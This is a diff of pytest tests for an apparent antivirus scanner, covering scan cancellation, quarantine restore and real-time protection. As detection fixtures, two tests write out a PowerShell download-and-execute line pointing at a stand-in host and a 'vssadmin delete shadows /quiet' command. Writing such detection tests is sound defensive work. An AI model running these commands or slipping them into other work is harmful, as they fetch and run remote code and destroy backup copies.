@@ -2,7 +2,9 @@
 
 from __future__ import annotations
 
+import shutil
 import time
+from pathlib import Path
 
 import pytest
 
@@ -67,6 +69,60 @@ def test_scan_job_can_be_cancelled(tmp_path):
     assert not job.is_running
 
 
+def test_stopping_a_scan_is_immediate(tmp_path):
+    """The stop button must take effect at once, not when the workers drain.
+
+    A scan that still reports itself as running keeps its card on the
+    dashboard, which reads as the stop having been ignored.
+    """
+    for index in range(2000):
+        (tmp_path / f"file{index}.txt").write_text("content " * 400)
+
+    job = ScanJob(targets=[tmp_path], scan_type=ScanType.CUSTOM).start()
+    for _ in range(200):
+        if job.progress.state is ScanState.RUNNING:
+            break
+        time.sleep(0.02)
+
+    job.cancel()
+    assert job.progress.state is ScanState.CANCELLED
+    assert not job.is_running
+    assert job.progress.finished_at is not None
+
+    job.join(timeout=60)
+    assert job.progress.state is ScanState.CANCELLED
+
+
+def test_stopping_a_scan_survives_the_workers_finishing(tmp_path):
+    """Late progress flushes must not put a stopped scan back on the dashboard."""
+    for index in range(600):
+        (tmp_path / f"file{index}.txt").write_text("content " * 200)
+
+    job = ScanJob(targets=[tmp_path], scan_type=ScanType.CUSTOM).start()
+    job.cancel()
+    job.join(timeout=60)
+    assert job.progress.state is ScanState.CANCELLED
+    assert not job.is_running
+
+
+def test_stopping_interrupts_the_file_walk(tmp_path):
+    """Counting the files of a full scan must not outlive the stop button."""
+    import threading
+
+    from guardiantus.core.scanner import count_files
+
+    for depth in range(30):
+        directory = tmp_path / f"d{depth}"
+        directory.mkdir()
+        for index in range(200):
+            (directory / f"f{index}.txt").write_text("x")
+
+    cancel = threading.Event()
+    cancel.set()
+    assert count_files([tmp_path], cancel=cancel) == 0
+    assert list(iter_files([tmp_path], cancel=cancel)) == []
+
+
 def test_scan_job_reports_progress(samples):
     seen = []
     job = ScanJob(
@@ -112,6 +168,85 @@ def test_quarantine_removes_and_restores_exactly(samples):
     assert restored == target
     assert target.read_bytes() == original
     assert vault.list_entries() == []
+
+
+def test_restoring_allows_the_file_from_then_on(samples):
+    """A restore that the next scan undoes is not a restore."""
+    vault = get_quarantine()
+    scanner = FileScanner()
+    target = samples / "eicar.com"
+
+    entry = vault.quarantine_file(scanner.scan_file(target))
+    vault.restore(entry.entry_id)
+
+    assert target.exists()
+    assert FileScanner().scan_file(target).verdict is Verdict.CLEAN
+
+
+def test_restoring_survives_realtime_protection(tmp_path, samples):
+    """Real-time protection used to re-quarantine a restored file in seconds."""
+    watched = tmp_path / "watched"
+    watched.mkdir()
+    dropped = watched / "payload.sh"
+    dropped.write_text((samples / "shell.sh").read_text())
+
+    vault = get_quarantine()
+    entry = vault.quarantine_file(FileScanner().scan_file(dropped))
+    assert not dropped.exists()
+
+    protection = RealtimeProtection()
+    protection.config.set("realtime", "debounce_seconds", 0.0)
+    vault.restore(entry.entry_id)
+
+    protection.scan_now(str(dropped))
+    assert dropped.exists(), "the restored file was taken away again"
+    assert protection.threats_blocked == 0
+
+
+def test_restore_can_be_retried_after_a_failed_write(samples, monkeypatch):
+    """A failure must leave the entry restorable, not strand it in the vault."""
+    vault = get_quarantine()
+    target = samples / "eicar.com"
+    entry = vault.quarantine_file(FileScanner().scan_file(target))
+
+    def explode(*_args, **_kwargs):
+        raise OSError("device is busy")
+
+    monkeypatch.setattr(Path, "write_bytes", explode)
+    with pytest.raises(QuarantineError):
+        vault.restore(entry.entry_id)
+    monkeypatch.undo()
+
+    assert len(vault.list_entries()) == 1, "the entry disappeared after a failed restore"
+    assert vault.restore(entry.entry_id) == target
+    assert target.exists()
+
+
+def test_restore_recreates_a_deleted_parent_directory(tmp_path):
+    """Temp folders vanish between runs; the file still has to come back."""
+    directory = tmp_path / "gone" / "deeper"
+    directory.mkdir(parents=True)
+    victim = directory / "payload.txt"
+    victim.write_text("GUARDIANTUS-AV-SIGNATURE-SELFTEST-FILE-DO-NOT-REMOVE\n")
+
+    vault = get_quarantine()
+    entry = vault.quarantine_file(FileScanner().scan_file(victim))
+    shutil.rmtree(tmp_path / "gone")
+
+    assert vault.restore(entry.entry_id) == victim
+    assert victim.exists()
+
+
+def test_restore_marks_the_detection_as_restored(samples, app):
+    vault = get_quarantine()
+    job = ScanJob(targets=[samples], scan_type=ScanType.CUSTOM, db=app.db, auto_quarantine=True)
+    job.run()
+
+    entry = next(e for e in vault.list_entries() if e["original_path"].endswith("eicar.com"))
+    vault.restore(entry["entry_id"])
+
+    handled = {d["path"]: d["handled"] for d in app.db.recent_detections()}
+    assert handled[entry["original_path"]] == "restored"
 
 
 def test_quarantined_payload_is_not_stored_verbatim(samples):
@@ -237,6 +372,38 @@ def test_realtime_refuses_bad_paths(tmp_path):
     protection = RealtimeProtection()
     with pytest.raises(RuntimeError):
         protection.start([str(tmp_path / "does-not-exist")])
+
+
+def test_only_confirmed_threats_are_moved(tmp_path):
+    """A heuristic guess is reported; it does not silently move the file."""
+    script = tmp_path / "installer.ps1"
+    script.write_text(
+        "$c = New-Object System.Net.WebClient\n"
+        "Invoke-Expression $c.DownloadString('http://example.invalid/x.ps1')\n"
+    )
+    result = FileScanner().scan_file(script)
+    assert result.is_threat
+
+    job = ScanJob(targets=[tmp_path], scan_type=ScanType.CUSTOM, auto_quarantine=True)
+    job.run()
+
+    suspicious = [t for t in job.threats if t.verdict is Verdict.SUSPICIOUS]
+    assert all(not t.quarantined for t in suspicious)
+    for threat in suspicious:
+        assert Path(threat.path).exists(), "a suspicion should not move a file"
+
+
+def test_suspicious_files_are_moved_when_asked(tmp_path):
+    from guardiantus.config import get_config
+
+    script = tmp_path / "note.txt"
+    script.write_text("ALPHA " * 50 + "\nvssadmin delete shadows /quiet\n")
+    get_config().set("scanning", "quarantine_suspicious", True)
+
+    job = ScanJob(targets=[tmp_path], scan_type=ScanType.CUSTOM, auto_quarantine=True)
+    job.run()
+    assert job.progress.threats_found >= 1
+    assert all(t.quarantined for t in job.threats)
 
 
 def test_scan_quarantine_follows_config(samples):
